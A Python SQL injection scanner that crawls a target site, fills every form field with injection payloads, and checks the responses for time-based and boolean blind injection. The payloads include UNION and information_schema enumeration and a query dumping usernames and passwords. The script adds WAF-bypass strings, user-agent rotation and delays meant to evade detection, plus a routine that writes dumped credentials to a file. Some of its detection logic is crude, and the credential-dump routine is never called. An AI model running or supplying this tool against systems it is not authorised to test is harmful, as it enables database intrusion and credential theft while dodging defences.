import requests
import logging
import threading
import time
import random
import hashlib
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import re
import colorlog  # For colored logging

# Setup colored logging
LOG_FORMAT = "[%(levelname)s] %(message)s"
logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)

# Create a color log handler with a proper colored formatter
logger = logging.getLogger()
handler = colorlog.StreamHandler()
formatter = colorlog.ColoredFormatter(
    "%(log_color)s[%(levelname)s] %(message)s",
    datefmt=None,
    log_colors={
        'DEBUG': 'yellow',
        'INFO': 'yellow',
        'WARNING': 'yellow',
        'ERROR': 'yellow',
        'CRITICAL': 'yellow'
    }
)
handler.setFormatter(formatter)
logger.addHandler(handler)

# Global variables
found_vulnerabilities = []
lock = threading.Lock()
payloads = []
waf_bypass_payloads = ['/*', ' OR 1=1--', ' AND 1=1--', '%20OR%201%3D1%20--']
threads = []

# SQL injection payloads
payloads += [
    "' OR 1=1 --",  # Basic SQLi payload
    "' OR 'a'='a",  # Another simple SQL injection
    "' UNION SELECT NULL,NULL,NULL --",  # Union based injection
    "' AND 1=2 --",  # False condition (error-based)
    "' OR 1=1 LIMIT 1 --",  # Limits
    "' AND SLEEP(5) --",  # Time-based injection (delayed response)
    "' OR 1=1 --",  # Common injection
    "'; SELECT table_name FROM information_schema.tables --",  # Tables enumeration
    "'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Columns enumeration
    "'; SELECT username, password FROM users --",  # Attempt to dump credentials (example)
    "' AND 1=1 --",  # Boolean-based true condition
    "' AND 1=2 --",  # Boolean-based false condition
]

# Headers to make requests seem normal
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# Time delay to avoid hitting WAFs
def delay_request():
    time.sleep(random.uniform(0.5, 1.5))  # Random delay between 0.5 and 1.5 seconds

# Function to evade WAF detection using user-agent rotation
def get_random_user_agent():
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
        'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; en-US) like Gecko',
    ]
    return random.choice(agents)

# Function to perform SHA-1 hashing
def sha1_hash(value):
    sha1 = hashlib.sha1()
    sha1.update(value.encode('utf-8'))
    return sha1.hexdigest()

# Function to dump hashed credentials to a file
def dump_credentials(data):
    # Hash the data (simulating sensitive data storage as SHA-1)
    hashed_data = sha1_hash(data)
    with open('dumped_credentials.txt', 'a') as f:
        f.write(hashed_data + "\n")
    logger.info("Credentials (hashed) dumped to 'dumped_credentials.txt'")

# Function to check for time-based blind SQLi vulnerability
def check_time_based_injection(url, payload):
    start_time = time.time()
    try:
        headers['User-Agent'] = get_random_user_agent()
        response = requests.get(url, params={'input': payload}, headers=headers, timeout=10)
        elapsed_time = time.time() - start_time
        if elapsed_time > 5:  # If the response time exceeds 5 seconds
            logger.info(f"[TIME BASED] Blind SQL Injection found at {url} with payload {payload}")
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        logger.error(f"Error checking time-based vulnerability: {e}")
        return False

# Function to perform SQL injection on a URL with the given payloads
def test_sql_injection(url, method, form_data):
    for payload in payloads:
        data = form_data.copy()  # Avoid modifying original form data
        for key in data:
            data[key] = payload  # Inject the payload into each form input field

        try:
            delay_request()
            headers['User-Agent'] = get_random_user_agent()
            if method.lower() == 'get':
                response = requests.get(url, params=data, headers=headers, timeout=5)
            elif method.lower() == 'post':
                response = requests.post(url, data=data, headers=headers, timeout=5)
            else:
                continue

            # Checking for time-based blind injection
            if check_time_based_injection(url, payload):
                logger.info(f"Time-based Blind SQLi vulnerability found at {url} with payload {payload}")

            # Checking for boolean-based blind injection
            if "' AND 1=1 --" in payload:
                if "success" in response.text.lower():  # Check for boolean true response (e.g., success text)
                    logger.info(f"Boolean-based Blind SQLi vulnerability found at {url} with payload {payload} (True Condition)")
            elif "' AND 1=2 --" in payload:
                if "failure" in response.text.lower():  # Check for boolean false response (e.g., failure text)
                    logger.info(f"Boolean-based Blind SQLi vulnerability found at {url} with payload {payload} (False Condition)")

            # Other vulnerability checks like error-based or MySQL-based injections can also go here

        except requests.exceptions.RequestException as e:
            logger.error(f"Error testing SQL injection on {url}: {str(e)}")

# Function to scan forms on a page
def scan_forms(url):
    try:
        response = requests.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')

        forms = soup.find_all('form')
        logger.info(f"Scanning {len(forms)} forms on {url}")

        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            action_url = urljoin(url, action)

            form_data = {}
            inputs = form.find_all('input')
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    form_data[name] = ""  # Empty data for injection

            if form_data:
                test_sql_injection(action_url, method, form_data)
            else:
                logger.info(f"No form inputs found on {url}.")
    except requests.exceptions.RequestException as e:
        logger.error(f"Error while fetching {url}: {str(e)}")

# Function to crawl and explore the target URL (multiple pages)
def crawl(url):
    urls_to_scan = [url]
    visited_urls = set()

    while urls_to_scan:
        current_url = urls_to_scan.pop()

        if current_url in visited_urls:
            continue

        visited_urls.add(current_url)
        logger.info(f"Scanning {current_url}")
        scan_forms(current_url)

        # Crawl links on the page
        try:
            response = requests.get(current_url, headers=headers, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Extract all hyperlinks
            links = soup.find_all('a', href=True)
            for link in links:
                full_url = urljoin(current_url, link['href'])
                parsed_url = urlparse(full_url)
                if parsed_url.netloc == urlparse(url).netloc:  # Limit to the same domain
                    urls_to_scan.append(full_url)

        except requests.exceptions.RequestException as e:
            logger.error(f"Error fetching links from {current_url}: {str(e)}")

# Main function
def main(target_url):
    logger.info(f"Starting SQL Injection scan on {target_url}")
    crawl(target_url)
    logger.info("Scan completed")

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="SQL Injection Scanner with Blind and Time-Based Injection Detection")
    parser.add_argument('-u', '--url', type=str, required=True, help="Target URL")
    args = parser.parse_args()

    main(args.url)
